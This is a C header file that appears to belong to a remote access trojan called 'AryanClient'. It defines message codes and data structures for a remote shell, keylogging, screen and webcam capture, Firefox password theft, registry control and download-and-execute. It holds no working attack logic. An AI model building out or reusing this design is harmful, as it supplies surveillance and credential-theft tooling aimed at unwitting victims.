#ifndef __AryanClient_h
#define __AryanClient_h 

#define  STATUS							1990
#define  PACKET_ADD_ID					1991
#define	 PACKET_USER_JOINED				1992
#define  PACKET_EXIT					1993
/////////////////////////////////////////////////
//Shell Packet headers
#define  PACKET_CMD_RECV			     2000
#define  PACKET_REMOTE_SHELL_START		 2001
/////////////////////////////////////////////////
//Task manager Packet headers
#define	 PACKET_TASK_MANAGER			 2002
#define	 PACKET_TASK_MANAGER_KILL		 2003
#define  PACKET_TASK_MANAGER_TASKS       2004
#define	 PACKET_TASK_MANAGER_KTASK		 2005
#define  PACKET_TASK_MANAGER_TEXT		 2006
/////////////////////////////////////////////////
//File manager Packet headers
#define	 PACKET_FILE_MANAGER_DRIVE		 2010
#define	 PACKET_FILE_MANAGER_FOLDER		 2011
#define  PACKET_FILE_MANAGER_FILE		 2012
#define  PACKET_FILE_MANAGER_FILE_FOLDER 2013
#define	 PACKET_FILE_MANAGER_FILE_COPY   2014
#define  PACKET_FILE_MANAGER_NEW_FOLDER  2015
#define  PACKET_FILE_MANAGER_DELETE_FILE 2016
#define  PACKET_FILE_MANAGER_FILE_CUT    2017
#define  PACKET_FILE_MANAGER_FILE_RENAME 2018
#define  PACKET_FILE_MANAGER_FILE_RECV_S 2019
#define  PACKET_FILE_MANAGER_FILE_RECV	 2020
#define  PACKET_FILE_MANAGER_FILE_C      2021
#define	 PACKET_FILE_MANAGER_FILE_DOWN	 2022
#define  PACKET_FILE_MANAGER_FILE_UPDATE_WIN 2023
#define  PACKET_FILE_MANAGER_SEARCH		 2024
#define  DONE							 2025
#define  PACKET_FILE_MANAGER_FILE_EXECUTE 2026
#define  PACKET_FILE_MANAGER_FILE_OPEN	 2027
#define  PACKET_FILE_DOWNLOAD_STAT		 2028
/////////////////////////////////////////////////
//Computer Packet headers
#define  PACKET_COMPUTER_LOGOFF			 2030
#define  PACKET_COMPUTER_SHUTDOWN		 2031
#define  PACKET_COMPUTER_LOCK			 2032
/////////////////////////////////////////////////
//Keylogger Packet headers
#define  PACKET_KEYLOGGER		         2060
#define  PACKET_KEYLOGGER_WINDOW		 2061
#define  PACKET_KEYLOGGER_OFF			 2062
#define	 PACKET_KEYLOG_OFFLINE			 2063
#define  PACKET_KEYLOG_DOWNLOAD			 2064
#define  PACKET_KEYLOG_OPEN				 2065
#define	 PACKET_KEYLOG_DOWNLOAD_UPDATE	 2066
//////////////////////////////////////////////////
//Screen capture Packet Headers
#define  SCREEN_CAPTURE					 2050
#define  SCREEN_SHOT_OPEN				 2051
#define	 SCREEN_SHOT_CLOSE				 2052
#define  SCREEN_SHOT_RECV				 2053
//////////////////////////////////////////////////
//Passwords Packet headers
#define  PASSWORD_FIREFOX				 2070
//Services Packet headers
#define  PACKET_SERVICE_MAN				 2080
//RegManager
#define  PACKET_REG_MANAGER				 2090
////////////////////////////////////////////////
//Download Execute	
#define  PACKET_DOWNLOAD_EXECUTE		 3000
////////////////////////////////////////////////
//Query Installs	
#define  PACKET_PROGRAM_FILES			 3010
#define  EXECUTE						 3011
////////////////////////////////////////////////
#define	 WEBCAM_CAPTURE					 3020
//////////////////////////////////////////////// 
#define	 PICTURE_NAME                    "Screeny.jpeg"


#define MAX_LOADSTRING	100
#define HIMETRIC_INCH	2540
#define MAP_LOGHIM_TO_PIX(x,ppli)   ( ((ppli)*(x) + HIMETRIC_INCH/2) / HIMETRIC_INCH )

typedef struct {
 WORD x,y;  // dimensions
 WORD l;    // bytes per scan-line (32-bit allignment)
 BYTE *b;   // bits of bitmap,3 bytes/pixel, BGR
} tWorkBMP;  // 24-bit working bitmap

typedef struct
{
DWORD	PacketType;
	char    Data		[512];
	char	PID			[50];
	char    Threads		[50];
	char	ParentPID	[50];
	char	PRIORITY	[50];
	char	Buf			[100];
	char	Buf2		[50];
	char	Buf3		[50];
	char    IDS			[10];
	int		ID;
	int		ID2;
	int		ID3;
} PACKETHEAD;

struct PACKETFILE
{
	DWORD	PacketType;
	char    Data		[4096];
	int		ID;
	int		ID2;
	int		ID3;
	int		ID4;
} ;
typedef struct
{
	DWORD	PacketType;
	char    Data		[4096];
	int		ID;
	int		ID2;
	int		ID3;
	int		ID4;
} PACKETFRECV;

typedef struct
{
	DWORD	PacketType;
	char    Data		[4096];
	int		ID;
} PACKETCMD;

struct mystruct {
HBITMAP Screen;
int ID;
int ID3;
int ID4;
} ;

struct FileStruct {
char ID [10];
char IP [50];
};

#endif